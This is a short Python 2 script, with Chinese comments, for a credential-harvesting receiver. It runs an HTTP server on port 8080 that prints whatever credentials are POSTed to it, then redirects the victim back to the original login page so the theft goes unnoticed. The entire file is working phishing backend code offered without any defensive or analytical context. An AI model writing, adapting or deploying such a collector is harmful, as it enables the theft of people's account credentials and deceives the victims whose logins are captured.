#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 创建接收服务器

import SimpleHTTPServer
import SocketServer
import urllib
import socket
import urlparse

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        # content_length = int(self.headers.getheaders("Content-Length")[0])

        creds = self.rfile.read(content_length).decode('utf-8')
        print creds

        # 只能重定向到登陆页面（需要再次登陆）
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()